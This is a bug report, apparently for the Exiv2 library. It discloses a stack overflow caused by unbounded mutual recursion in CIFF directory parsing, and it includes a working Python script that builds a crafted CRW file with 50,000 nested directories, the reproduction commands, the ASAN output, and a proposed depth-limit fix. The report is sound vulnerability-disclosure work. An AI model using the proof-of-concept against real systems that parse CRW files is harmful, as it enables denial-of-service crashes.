## Bug1: Stack overflow via uncontrolled recursion in CIFF directory parsing

**Describe the bug**

`CiffDirectory::readDirectory()` and `CiffDirectory::doRead()` in `src/crwimage_int.cpp` mutually recurse on every nested directory-type CIFF entry with no depth limit. A crafted CRW file with deeply nested directories exhausts the default 8 MB thread stack and crashes the process unconditionally. The only guard present is an overlap check (lines 190–197) that prevents cycles based on memory ranges, but it does not bound recursion depth, so a linear chain of 50 000 directories triggers a stack-overflow before any overlap is detected.

Any code path that opens an attacker-controlled CRW/CIFF file is affected, including `exiv2 pr`, `exiv2 ex`, and library consumers that call `CrwImage::readMetadata()`.

**To Reproduce**

Generate the PoC file with the script below, then run exiv2 against it:

```python
#!/usr/bin/env python3
# gen.py — generates poc_input.crw
import struct

D = 50000  # recursion depth
H = 4 + D * 16

heap = bytearray(H)

# Leaf at heap[0..3]: count=0, no entries (base case)
for L in range(D):
    E = H - (L + 1) * 16
    struct.pack_into('<H', heap, E + 0,  1)       # count = 1
    struct.pack_into('<H', heap, E + 2,  0x2800)  # tag: directory, valueData
    struct.pack_into('<I', heap, E + 4,  E)        # size_field = E (sub-dir size)
    struct.pack_into('<I', heap, E + 8,  0)        # offset_field = 0 (sub-dir base)
    struct.pack_into('<I', heap, E + 12, E)        # o_field = E (entry table offset)

HEAP_OFFSET = 26
header = bytearray()
header += b'II'
header += struct.pack('<I', HEAP_OFFSET)
header += b'HEAPCCDR'
header += struct.pack('<H', 1)
header += struct.pack('<H', 2)
header += b'\x00' * 8

assert len(header) == HEAP_OFFSET

with open('poc_input.crw', 'wb') as f:
    f.write(header)
    f.write(heap)

print(f"[+] Written: poc_input.crw ({len(header) + len(heap)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build/bin/exiv2 pr poc_input.crw || true
grep -h "AddressSanitizer\|ERROR:\|runtime error:" ./asan.log.* 2>/dev/null
```

Branch/commit tested: `main` @ `dc9364baa` (2026-09-04)

**Expected behavior**

Exiv2 should reject or safely handle CRW files with deeply nested directories without crashing (e.g., return an error or enforce a maximum recursion depth).

**Desktop**

- OS: Ubuntu 22.04.5 LTS (Linux 5.15.0-170-generic x86_64)
- Exiv2 version: 1.00.0.9, built from source, commit `dc9364baa` (2026-09-04)
- Compiler: GCC 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
- Compilation flags: `-fsanitize=address,undefined -g0 -fno-omit-frame-pointer`, `CMAKE_BUILD_TYPE=Release`

**Additional context**

ASAN output:

```
ERROR: AddressSanitizer: stack-overflow on address 0x7ffec03d7ff8
    (pc 0x7f4e6127d6c8 bp 0x000000000001 sp 0x7ffec03d8000 T0)
    #4 in Exiv2::Internal::CiffDirectory::readDirectory(unsigned char const*,
           unsigned long, Exiv2::ByteOrder)  (libexiv2.so.30+0x3836b52)
    #5 in Exiv2::Internal::CiffDirectory::doRead(unsigned char const*,
           unsigned long, unsigned int, Exiv2::ByteOrder)  (libexiv2.so.30+0x38387d0)
SUMMARY: AddressSanitizer: stack-overflow in __asan::GetCurrentThread()
```

The vulnerable call chain is:

```
CrwImage::readMetadata()
  → CiffDirectory::read()
    → CiffDirectory::doRead()          // src/crwimage_int.cpp
      → CiffDirectory::readDirectory() // calls doRead() for each sub-directory entry
        → CiffDirectory::doRead()      // recurse — no depth counter
          → ...
```

A simple fix is to thread a depth counter through `readDirectory` / `doRead` and return an error once a configurable limit (e.g., 500) is exceeded. Alternatively, an iterative approach using an explicit stack would eliminate the issue entirely.

<!-- REPORT_SOURCE: include_exiv2_crwimage_hpp#001 -->
<!-- DEDUP: CiffDirectory::readDirectory::CWE-674 -->
